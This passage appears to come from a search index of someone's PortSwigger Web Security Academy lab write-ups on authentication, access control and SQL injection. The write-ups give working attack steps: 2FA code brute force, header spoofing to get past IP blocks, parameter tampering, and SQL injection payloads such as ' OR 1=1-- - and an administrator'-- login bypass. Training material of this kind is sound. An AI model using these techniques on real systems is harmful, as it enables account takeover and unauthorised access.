password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his \"My account\" page.</p> <ul> <li>Your credentials:Â <code>wiener:peter</code></li> <li>Victim's username:Â <code>carlos</code></li> </ul>","path":["Resources","PortSwigger","Authentication","Password reset broken logic"],"tags":["authn","password-reset"]},{"location":"resources/PortSwigger/Authentication/authn-lab-3/#solution","level":2,"title":"Solution","text":"<p>The login page has a forgot password functionality, where the user can enter their email to get a reset link.</p> <p></p> <p>When you get the email, there is a link with a temporary reset token. It's important to not use this token yet, otherwise you'll have to request another one. </p> <p></p> <p>Set your proxy to intercept requests and click on the reset link. Keep the intercept proxy on and enter a new password. Note that the username parameter is included in the request. </p> <p></p> <p>Change the username from \"wiener\" to \"carlos\" and forward the request.</p> <p>Now you can log in as Carlos and solve the lab.</p> <p></p>","path":["Resources","PortSwigger","Authentication","Password reset broken logic"],"tags":["authn","password-reset"]},{"location":"resources/PortSwigger/Authentication/authn-lab-4/","level":1,"title":"Username enumeration via subtly different responses","text":"","path":["Resources","PortSwigger","Authentication","Username enumeration via subtly different responses"],"tags":["authn","username-enum"]},{"location":"resources/PortSwigger/Authentication/authn-lab-4/#instructions","level":2,"title":"Instructions","text":"<p>This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:</p> <ul> <li>Candidate usernames</li> <li>Candidate passwords</li> </ul> <p>To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.</p>","path":["Resources","PortSwigger","Authentication","Username enumeration via subtly different responses"],"tags":["authn","username-enum"]},{"location":"resources/PortSwigger/Authentication/authn-lab-4/#solution","level":2,"title":"Solution","text":"<p>Upon trying to log in with invalid credentials, we get the following error message:</p> <p></p> <p>Note the period at the end of the message.</p> <p>Run this through intruder with the username list provided and filter on the previous error message. One username results in a request that is slightly different (no period at the end). </p> <p></p> <p>Send that request back to intruder and brute force the correct password with the list of passwords provided. </p> Successful login request<pre><code>POST /login HTTP/1.1\nHost: 0a43007d046a6c5b853a0a94005800cf.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 36\nOrigin: https://0a43007d046a6c5b853a0a94005800cf.web-security-academy.net\nConnection: close\nReferer: https://0a43007d046a6c5b853a0a94005800cf.web-security-academy.net/login\nCookie: session=dYbWDRS4XMQZ4kYPpHVWUKipIHLqZDVP\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: magenta\nPriority: u=0, i\n\nusername=amarillo&amp;password=123456789\n</code></pre> <p>Login as amarillo to solve the lab.</p>","path":["Resources","PortSwigger","Authentication","Username enumeration via subtly different responses"],"tags":["authn","username-enum"]},{"location":"resources/PortSwigger/Authentication/authn-lab-5/","level":1,"title":"Username enumeration via response timing","text":"","path":["Resources","PortSwigger","Authentication","Username enumeration via response timing"],"tags":["authn","username-enum","response-timing"]},{"location":"resources/PortSwigger/Authentication/authn-lab-5/#instructions","level":2,"title":"Instructions","text":"<p>This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.</p> <ul> <li>Your credentials:Â <code>wiener:peter</code></li> <li>Candidate usernames</li> <li>Candidate passwords</li> </ul> <p>??? warning \"Hint\"</p> <pre><code>To add to the challenge, the lab also implements a form of IP-based brute-force protection. However, this can be easily bypassed by manipulating HTTP request headers.\n</code></pre>","path":["Resources","PortSwigger","Authentication","Username enumeration via response timing"],"tags":["authn","username-enum","response-timing"]},{"location":"resources/PortSwigger/Authentication/authn-lab-5/#solution","level":2,"title":"Solution","text":"<p>Log in with the credentials provided and note the response time. </p> <p></p> <p>Also note the response time when using an invalid username and a long, complex password. </p> <p></p> <p>The round-trip response time when trying to log in with a valid username and a long password is significantly longer. </p> <p></p> <p>We can use this to filter in intruder. </p> <p>Remember that there is a IP block in place, so in the intruder request, add an <code>X-Forwarded-For</code> header, and set it to <code>127.0.0.1</code>. Set a placeholder on the last octet, and set the payload to numbers, 1-255. Set another placeholder on the username and set the payload to the list of usernames provided. </p> <p>Start the pitchfork/parallel attack, and look for round trip time around what we noticed before for a valid username. </p> <p></p> <p>So we have a username -- <code>app</code>. Send this login request back to intruder and set the placeholders on the last octet of the X-Forwarded-For host and the password.</p> <p>Run the next parallel attack and look for a response that stands out from the rest somehow.</p> <p>There is one request that is a 302 status code, showing the correct password is <code>summer</code>. </p> <p></p> <p>Log in as the <code>app</code> user to solve the lab.</p>","path":["Resources","PortSwigger","Authentication","Username enumeration via response timing"],"tags":["authn","username-enum","response-timing"]},{"location":"resources/PortSwigger/Authentication/authn-lab-8/","level":1,"title":"2FA broken logic","text":"","path":["Resources","PortSwigger","Authentication","2FA broken logic"],"tags":["authn","mfa"]},{"location":"resources/PortSwigger/Authentication/authn-lab-8/#instructions","level":2,"title":"Instructions","text":"<p>This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.</p> <ul> <li>Your credentials:Â <code>wiener:peter</code></li> <li>Victim's username:Â <code>carlos</code></li> </ul> <p>You also have access to the email server to receive your 2FA verification code.</p>","path":["Resources","PortSwigger","Authentication","2FA broken logic"],"tags":["authn","mfa"]},{"location":"resources/PortSwigger/Authentication/authn-lab-8/#solution","level":2,"title":"Solution","text":"<p>When we log into our account and get the MFA code in the email client, we can see that the username is used to determine which account is being verified. </p> Username used to verify<pre><code>POST /login2 HTTP/2\nHost: 0a660055046432c782cebb6000900070.web-security-academy.net\nCookie: session=p9VYvqy3gpT5tuxmYocM1sDCWn6iMS3T; verify=wiener\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 13\nOrigin: https://0a660055046432c782cebb6000900070.web-security-academy.net\nReferer: https://0a660055046432c782cebb6000900070.web-security-academy.net/login2\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nPriority: u=0, i\nTe: trailers\n\nmfa-code=0000\n</code></pre> <p>To solve the lab, send the <code>GET /login2</code> request to repeater, and change the verify parameter to <code>carlos</code>. This will generate an MFA code for carlos. </p> <p>Then, log in with our credentials, but submit an invalid MFA code. Send the previously submitted <code>POST /login2</code> request to intruder and add a placeholder on the mfa-code value. Be sure to change the verify value to carlos before sending.</p> <p>Set the intruder to sniper and the payload to numbers 0000-9999. Look for the 302 status code. Once you have that, right click and select view in browser. </p> <p>Paste the generated URL into your browser and you will be dropped into carlos' account page. </p>","path":["Resources","PortSwigger","Authentication","2FA broken logic"],"tags":["authn","mfa"]},{"location":"resources/PortSwigger/Authentication/authn-lab-9/","level":1,"title":"Brute-forcing a stay-logged-in cookie","text":"","path":["Resources","PortSwigger","Authentication","Brute-forcing a stay-logged-in cookie"],"tags":["authn","cookies"]},{"location":"resources/PortSwigger/Authentication/authn-lab-9/#instructions","level":2,"title":"Instructions","text":"<p>This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.</p> <p>To solve the lab, brute-force Carlos's cookie to gain access to hisÂ My accountÂ page.</p> <ul> <li>Your credentials:Â <code>wiener:peter</code></li> <li>Victim's username:Â <code>carlos</code></li> <li>Candidate passwords</li> </ul>","path":["Resources","PortSwigger","Authentication","Brute-forcing a stay-logged-in cookie"],"tags":["authn","cookies"]},{"location":"resources/PortSwigger/Authentication/authn-lab-9/#solution","level":2,"title":"Solution","text":"<p>When logging in an selecting the \"stay logged in\" option, we see that two cookies are set.</p> <p></p> <p>The session cookie is dynamic and changes every time we log in, but the <code>stay-logged-in</code> cookie stays the same. </p> <p>Send the login request to sequencer and analyze both cookies. The stay-logged-in cookie entropy is extremely poor.</p> <p></p> <p>The characters all stay the same, confirming what we observed from sending multiple login requests in repeater. </p> <p></p> <p>Looking at the cookie in decoder shows that it is made up of the username and an md5 hash, separated by a colon. We can use this to brute force the password for Carlos. </p> <p></p> <p>Send the request for /my-account to intruder. Change the id to carlos, and set a placeholder around the stay-logged-in cookie. Make sure to remove the session token from the intruder request. </p> <p>Set the following payload processing rules:</p> <p></p> <p>After running the attack in intruder, check for responses that stand out. </p> <p></p> <p>This solves the lab.</p>","path":["Resources","PortSwigger","Authentication","Brute-forcing a stay-logged-in cookie"],"tags":["authn","cookies"]},{"location":"resources/PortSwigger/Authorization/authz-lab-1/","level":1,"title":"Unprotected admin functionality","text":"","path":["Resources","PortSwigger","Authorization","Unprotected admin functionality"],"tags":["authz"]},{"location":"resources/PortSwigger/Authorization/authz-lab-1/#instructions","level":2,"title":"Instructions","text":"<p>This lab has an unprotected admin panel.</p> <p>Solve the lab by deleting the userÂ <code>carlos</code>.</p>","path":["Resources","PortSwigger","Authorization","Unprotected admin functionality"],"tags":["authz"]},{"location":"resources/PortSwigger/Authorization/authz-lab-1/#solution","level":2,"title":"Solution","text":"<p>Check the <code>robots.txt</code> file to find the location of the <code>/administrator-panel</code>.</p> <p></p> <p>Once there, just delete carlos and solve the lab.</p>","path":["Resources","PortSwigger","Authorization","Unprotected admin functionality"],"tags":["authz"]},{"location":"resources/PortSwigger/Authorization/authz-lab-12/","level":1,"title":"Multi-step process with no access control on one step","text":"","path":["Resources","PortSwigger","Authorization","Multi-step process with no access control on one step"],"tags":["authz"]},{"location":"resources/PortSwigger/Authorization/authz-lab-12/#instructions","level":2,"title":"Instructions","text":"<p>This lab has an admin panel with a flawed multi-step process for changing a user's role. You can familiarize yourself with the admin panel by logging in using the credentialsÂ <code>administrator:admin</code>.</p> <p>To solve the lab, log in using the credentialsÂ <code>wiener:peter</code>Â and exploit the flawed access controls to promote yourself to become an administrator.</p>","path":["Resources","PortSwigger","Authorization","Multi-step process with no access control on one step"],"tags":["authz"]},{"location":"resources/PortSwigger/Authorization/authz-lab-12/#solution","level":2,"title":"Solution","text":"<p>Logging in with the provided administrator credentials shows an option to upgrade a user. </p> <p>Upgrading the user is a two step process:</p> <ol> <li>Select upgrade user</li> <li>Confirm the choice</li> </ol> <p>The request for the second step is as follows:</p> Upgrade confirmation request<pre><code>POST /admin-roles HTTP/1.1\nHost: 0aa7004e04259e7882c2e2c0002d004e.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 45\nOrigin: https://0aa7004e04259e7882c2e2c0002d004e.web-security-academy.net\nConnection: keep-alive\nReferer: https://0aa7004e04259e7882c2e2c0002d004e.web-security-academy.net/admin-roles\nCookie: session=Eb26fNhuK8JD3jBofVGQQzID77m5Z3rb\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: orange\nPriority: u=0, i\n\naction=upgrade&amp;confirmed=true&amp;username=wiener\n</code></pre> <p>Logging out of the administrator account and into the normal 'wiener' account should allow us to send a request directly to this endpoint.</p> Upgrade request as wiener<pre><code>GET /admin HTTP/1.1\nHost: 0aa7004e04259e7882c2e2c0002d004e.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0aa7004e04259e7882c2e2c0002d004e.web-security-academy.net/login\nConnection: close\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: orange\nPriority: u=0, i\nContent-Type: application/x-www-form-urlencoded\nCookie: session=IYwt1ciNjesw8A5ooVXww8B8CzMJfaIu\n</code></pre> <p></p>","path":["Resources","PortSwigger","Authorization","Multi-step process with no access control on one step"],"tags":["authz"]},{"location":"resources/PortSwigger/Authorization/authz-lab-13/","level":1,"title":"Referer-based access control","text":"","path":["Resources","PortSwigger","Authorization","Referer-based access control"],"tags":["authz"]},{"location":"resources/PortSwigger/Authorization/authz-lab-13/#instructions","level":2,"title":"Instructions","text":"<p>This lab controls access to certain admin functionality based on the Referer header. You can familiarize yourself with the admin panel by logging in using the credentialsÂ <code>administrator:admin</code>.</p> <p>To solve the lab, log in using the credentialsÂ <code>wiener:peter</code>Â and exploit the flawed access controls to promote yourself to become an administrator.</p>","path":["Resources","PortSwigger","Authorization","Referer-based access control"],"tags":["authz"]},{"location":"resources/PortSwigger/Authorization/authz-lab-13/#solution","level":2,"title":"Solution","text":"<p>Start off by logging in as the administrator to get familiar with the admin panel.</p> <p>Note that when we access the /admin endpoint, the referer header shows that we're coming from the administrator's account page. </p> Accessing the admin panel<pre><code>GET /admin HTTP/1.1\nHost: 0a800032034584dc80b1f30b00460008.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nConnection: keep-alive\nReferer: https://0a800032034584dc80b1f30b00460008.web-security-academy.net/my-account?id=administrator\nCookie: session=CZ8z7nRZ256lmSsNSdLdKEdkoEvvcDiy\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: green\nPriority: u=0, i\n</code></pre> <p>Also note that when we try to access the /admin endpoint while logged in as wiener, we get a 401 status code. </p> <p></p> <p>Changing the URL here didn't work, so looking back at the request to upgrade a user, we see that the referer header indicates coming from the /admin endpoint itself. </p> Upgrading a user<pre><code>GET /admin-roles?username=wiener&amp;action=upgrade HTTP/1.1\nHost: 0a800032034584dc80b1f30b00460008.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nConnection: keep-alive\nReferer: https://0a800032034584dc80b1f30b00460008.web-security-academy.net/admin\nCookie: session=CZ8z7nRZ256lmSsNSdLdKEdkoEvvcDiy\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: green\nPriority: u=0, i\n</code></pre> <p>If we plug that URL in while logged in as wiener, then we're able to upgrade ourselves to an admin and solve the lab. </p> Solving the lab<pre><code>GET /admin-roles?username=wiener&amp;action=upgrade HTTP/1.1\nHost: 0a800032034584dc80b1f30b00460008.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0a800032034584dc80b1f30b00460008.web-security-academy.net/admin\nConnection: keep-alive\nCookie: session=zkw8pJY9jw6amiU95SsxlSDqndiZNdml\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: green\nPriority: u=0, i\n</code></pre>","path":["Resources","PortSwigger","Authorization","Referer-based access control"],"tags":["authz"]},{"location":"resources/PortSwigger/Authorization/authz-lab-5/","level":1,"title":"User ID controlled by request parameter","text":"","path":["Resources","PortSwigger","Authorization","User ID controlled by request parameter"],"tags":["authz"]},{"location":"resources/PortSwigger/Authorization/authz-lab-5/#instructions","level":2,"title":"Instructions","text":"<p>This lab has a horizontal privilege escalation vulnerability on the user account page.</p> <p>To solve the lab, obtain the API key for the userÂ <code>carlos</code>Â and submit it as the solution.</p> <p>You can log in to your own account using the following credentials:Â <code>wiener:peter</code></p>","path":["Resources","PortSwigger","Authorization","User ID controlled by request parameter"],"tags":["authz"]},{"location":"resources/PortSwigger/Authorization/authz-lab-5/#solution","level":2,"title":"Solution","text":"<p>After logging in with the credentials provided we're directed to the my-account page with the following request. Note the <code>id</code> parameter.</p> Initial request<pre><code>GET /my-account?id=wiener HTTP/1.1\nHost: 0a6b00d40496130b81167f58007a00e5.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0a6b00d40496130b81167f58007a00e5.web-security-academy.net/login\nConnection: keep-alive\nCookie: session=CbpTgQZBvWdK3HSu5NxzkkCBRCkiThgZ\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: orange\nPriority: u=0, i\n</code></pre> <p>To solve this lab, send this request to repeater, change the value of the <code>id</code> parameter from <code>wiener</code> to <code>carlos</code>. </p> <p>Note that we get a 200 status code and Carlos' API key is disclosed. </p> <p></p>","path":["Resources","PortSwigger","Authorization","User ID controlled by request parameter"],"tags":["authz"]},{"location":"resources/PortSwigger/Authorization/authz-lab-9/","level":1,"title":"Insecure direct object references","text":"","path":["Resources","PortSwigger","Authorization","Insecure direct object references"],"tags":["authz"]},{"location":"resources/PortSwigger/Authorization/authz-lab-9/#instructions","level":2,"title":"Instructions","text":"<p>This lab stores user chat logs directly on the server's file system, and retrieves them using static URLs.</p> <p>Solve the lab by finding the password for the userÂ <code>carlos</code>, and logging into their account.</p>","path":["Resources","PortSwigger","Authorization","Insecure direct object references"],"tags":["authz"]},{"location":"resources/PortSwigger/Authorization/authz-lab-9/#solution","level":2,"title":"Solution","text":"<p>This lab has a live chat functionality that allows downloading chat logs. Note the original chat below:</p> Original chat transcript<pre><code>GET /download-transcript/2.txt HTTP/1.1\nHost: 0a34009c04dc3ab780106cdd00ef003e.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0a34009c04dc3ab780106cdd00ef003e.web-security-academy.net/chat\nConnection: keep-alive\nCookie: session=u4v7AwzWpRT7ndqhIScxQr6Vig8KFD9P\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: orange\nPriority: u=0\n</code></pre> Original chat response<pre><code>HTTP/1.1 200 OK\nContent-Type: text/plain; charset=utf-8\nContent-Disposition: attachment; filename=\"2.txt\"\nX-Frame-Options: SAMEORIGIN\nConnection: close\nContent-Length: 44\n\nCONNECTED: -- Now chatting with Hal Pline --\n</code></pre> <p>To solve this lab, change the 2 to a 1 and access another user's chat history. </p> Modified request<pre><code>GET /download-transcript/1.txt HTTP/1.1\nHost: 0a34009c04dc3ab780106cdd00ef003e.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0a34009c04dc3ab780106cdd00ef003e.web-security-academy.net/chat\nConnection: keep-alive\nCookie: session=u4v7AwzWpRT7ndqhIScxQr6Vig8KFD9P\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: orange\nPriority: u=0\n</code></pre> <p>Note the password in the response.</p> Modified response<pre><code>HTTP/1.1 200 OK\nContent-Type: text/plain; charset=utf-8\nContent-Disposition: attachment; filename=\"1.txt\"\nX-Frame-Options: SAMEORIGIN\nConnection: close\nContent-Length: 520\n\nCONNECTED: -- Now chatting with Hal Pline --\nYou: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one\nHal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.\nYou: Wow you're so nice, thanks. I've heard from other people that you can be a right ****\nHal Pline: Takes one to know one\nYou: Ok so my password is 4vtfrzk4f8dgw362vt9v. Is that right?\nHal Pline: Yes it is!\nYou: Ok thanks, bye!\nHal Pline: Do one!\n</code></pre> <p>Log in as carlos to solve the lab.</p>","path":["Resources","PortSwigger","Authorization","Insecure direct object references"],"tags":["authz"]},{"location":"resources/PortSwigger/SQL-Injection/_cheatsheet/","level":1,"title":"SQL Injection Cheatsheet","text":"<ul> <li> Try injecting a single or double quote and look for changes in response</li> <li> Try adding comments on login forms to bypass authentication</li> <li> Try to enumerate the database type and version</li> <li> </li> </ul>","path":["Resources","PortSwigger","SQL Injection","SQL Injection Cheatsheet"],"tags":[]},{"location":"resources/PortSwigger/SQL-Injection/sqli-lab-1/","level":1,"title":"SQL injection vulnerability in WHERE clause allowing retrieval of hidden data","text":"","path":["Resources","PortSwigger","SQL Injection","SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"],"tags":["sql","injection"]},{"location":"resources/PortSwigger/SQL-Injection/sqli-lab-1/#instructions","level":2,"title":"Instructions","text":"<p>This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:</p> <p><code>SELECT * FROM products WHERE category = 'Gifts' AND released = 1</code></p> <p>To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.</p>","path":["Resources","PortSwigger","SQL Injection","SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"],"tags":["sql","injection"]},{"location":"resources/PortSwigger/SQL-Injection/sqli-lab-1/#solution","level":2,"title":"Solution","text":"<p>Selecting the \"Gifts\" category sends the following HTTP request:</p> Initial request<pre><code>GET /filter?category=Gifts HTTP/2\nHost: 0ac600c104a6ea1f8142ac0500a90084.web-security-academy.net\nCookie: session=inWxWwQQf5vbyXBx1iITGLWCQLAigyvg\nSec-Ch-Ua: \"Not_A Brand\";v=\"99\", \"Chromium\";v=\"142\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"macOS\"\nAccept-Language: en-US,en;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://0ac600c104a6ea1f8142ac0500a90084.web-security-academy.net/\nAccept-Encoding: gzip, deflate, br\nPriority: u=0, i\n</code></pre> <p>Adding a single quote after the query results in an error.</p> <p></p> <p>Adding a second single quote resolves the error. We can add an always true condition to display all products.</p> Final payload<pre><code>' OR 1=1-- -\n</code></pre> <p></p>","path":["Resources","PortSwigger","SQL Injection","SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"],"tags":["sql","injection"]},{"location":"resources/PortSwigger/SQL-Injection/sqli-lab-2/","level":1,"title":"SQL injection vulnerability allowing login bypass","text":"","path":["Resources","PortSwigger","SQL Injection","SQL injection vulnerability allowing login bypass"],"tags":["sql","injection"]},{"location":"resources/PortSwigger/SQL-Injection/sqli-lab-2/#instructions","level":2,"title":"Instructions","text":"<p>This lab contains a SQL injection vulnerability in the login function.</p> <p>To solve the lab, perform a SQL injection attack that logs in to the application as theÂ <code>administrator</code>user.</p>","path":["Resources","PortSwigger","SQL Injection","SQL injection vulnerability allowing login bypass"],"tags":["sql","injection"]},{"location":"resources/PortSwigger/SQL-Injection/sqli-lab-2/#solution","level":2,"title":"Solution","text":"<p>When we first send an invalid password, we get the following error:</p> Invalid logon request<pre><code>POST /login HTTP/2\nHost: 0ab900a10465b08981a5a2c20086002b.web-security-academy.net\nCookie: session=iB1idDnwSqOV70T4DLpWfM68h94zU5E2\nContent-Length: 78\nCache-Control: max-age=0\nSec-Ch-Ua: \"Not_A Brand\";v=\"99\", \"Chromium\";v=\"142\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"macOS\"\nAccept-Language: en-US,en;q=0.9\nOrigin: https://0ab900a10465b08981a5a2c20086002b.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://0ab900a10465b08981a5a2c20086002b.web-security-academy.net/login\nAccept-Encoding: gzip, deflate, br\nPriority: u=0, i\n\ncsrf=YvvJHYFQ9kAjzWNBu9gaWBatg2bYar9n&amp;username=administrator&amp;password=password\n</code></pre> <p></p> <p>If we just comment out the password field, we can bypass the authentication check and just log in with the username.</p> Final payload<pre><code>POST /login HTTP/2\nHost: 0ab900a10465b08981a5a2c20086002b.web-security-academy.net\nCookie: session=HCToViKrVJ273UADzIXS5QEtpbSU5ovg\nContent-Length: 85\nCache-Control: max-age=0\nSec-Ch-Ua: \"Not_A Brand\";v=\"99\", \"Chromium\";v=\"142\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"macOS\"\nAccept-Language: en-US,en;q=0.9\nOrigin: https://0ab900a10465b08981a5a2c20086002b.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://0ab900a10465b08981a5a2c20086002b.web-security-academy.net/login\nAccept-Encoding: gzip, deflate, br\nPriority: u=0, i\n\ncsrf=ftR0shmzbkLwCvuHdiNgunnZso1OGD1X&amp;username=administrator%27--+-&amp;password=password\n</code></pre> <p></p>","path":["Resources","PortSwigger","SQL Injection","SQL injection vulnerability allowing login bypass"],"tags":["sql","injection"]},{"location":"resources/PortSwigger/SQL-Injection/sqli-lab-3/","level":1,"title":"SQL injection attack, querying the database type and version on Oracle","text":"","path":["Resources","PortSwigger","SQL Injection","SQL injection attack, querying the database type and version on Oracle"],"tags":["injection","sql"]},{"location":"resources/PortSwigger/SQL-Injection/sqli-lab-3/#instructions","level":2,"title":"Instructions","text":"<p>This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.</p> <p>To solve the lab, display the database version string.</p> <p>??? warning \"Hint\"</p> <pre><code>On Oracle databases, everyÂ `SELECT`Â statement must specify a table to selectÂ `FROM`. If yourÂ `UNION SELECT`Â attack does not query from a table, you will still need to include theÂ `FROM`Â keyword followed by a valid table name.\n\nThere is a built-in table on Oracle calledÂ `dual`Â which you can use for this purpose. For example:Â `UNION SELECT 'abc' FROM dual`\n</code></pre>","path":["Resources","PortSwigger","SQL Injection","SQL injection attack, querying the database type and version on Oracle"],"tags":["injection","sql"]},{"location":"resources/PortSwigger/SQL-Injection/sqli-lab-3/#solution","level":2,"title":"Solution","text":"<p>Since the vulnerability lies in the category parameter, we will focus there. </p> Initial request<pre><code>GET /filter?category=Gifts HTTP/2\nHost: 0aca008a03ea55be81c7531f00dc005b.web-security-academy.net\nCookie: session=vHP4Xt5RPT4TD8vzgc4yEg8biGUdELPe\nSec-Ch-Ua: \"Not_A Brand\";v=\"99\", \"Chromium\";v=\"142\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"macOS\"\nAccept-Language: en-US,en;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: 